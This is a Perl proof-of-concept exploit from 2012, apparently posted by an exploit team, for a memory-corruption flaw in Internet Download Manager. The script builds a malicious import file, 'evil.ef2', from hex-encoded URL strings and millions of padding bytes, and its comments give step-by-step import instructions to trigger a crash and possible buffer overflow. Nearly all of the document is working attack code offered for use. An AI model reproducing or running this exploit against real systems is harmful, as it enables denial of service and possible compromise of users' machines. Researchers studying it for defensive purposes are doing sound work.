#!/usr/bin/perl
# 1               ==========================================               1
# 0                   I'm Dark-Puzzle From Inj3ct0r TEAM                   0
# 0                                                                        1
# 1                       dark-puzzle[at]live[at]fr                        0
# 0               ==========================================               1
# 1                              White Hat                                 1
# 0                         Independant Pentester                          0
# 1                      exploit coder/bug researcher                      0
# 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-1
# Title  : Internet Download Manager All Versions - Memory Corruption Vulnerability .
# Author : Dark-Puzzle (Souhail Hammou)
# Type   : Local 
# Risk   : Critical
# Vendor : Tonec Inc.
# Versions : All versions supporting the IDM file importation are Vulnerable .
# Tested On : Windows XP Service Pack 2 FR 32-bits , Windows 7 FR 64-bits
# Date : 31 August 2012
# Gr337ings to : Inj3ct0r Team - Packetstormsecurity.org - Securityfocus.com - Jigsaw - Dark-Soldier ...

#Vulnerability Details : Work your skills & imagination .


#Usage   : Copy this script to memorycorruption.pl
#Execute : perl memorycorruption.pl

#Howto : Go to Tasks ---> Import ---> From IDM export file ---> evil.ef2  (executing file as .eif may also work )
#              Taches --> Importer -> Depuis un fichier IDM ---> evil.ef2


my $hd = "\x3c\n";
my $ed = "\x3e\n";
my $ht = "\x68\x74\x74\x70\x3a\x2f\x2f";
my $lk = "\x77\x77\x77\x2e\x31\x33\x33\x37\x64\x61\x79\x2e\x63\x6f\x6d\x2f\x65\x78\x70\x6c\x6f\x69\x74\x73\x2f\x31\x39\x32\x31\x31\n";
my $fake ="\x2e\x63\x6f\x6d\x2f\x64\x61\x72\x6b\x70\x75\x7a\x7a\x6c\x65\x2e\x74\x78\x74\n";
my $txt = "\x41" x 2000000;
my $stx = "\x42" x 400000 ;
my $null = "\x00\x00"; # Not Necessary , but maybe more effective .

# Sorry Script Kiddies ...
# BOF is possible and every failed attempt will cause a Denial of Service Vulnerability .

my $file = "evil.ef2";

open ($File, ">$file");
print $File $hd.$ht.$lk.$ed.$hd.$ht.$txt.$stx.$fake.$ed;
close ($File);
print " Exploit By Dark-Puzzle \n" ;
print " Creating Evil File , Please Wait ...\n\n\n";
sleep (5);
print " Evil File Created Successfully , Happy Hunting :)\n";

# Datasec Team .








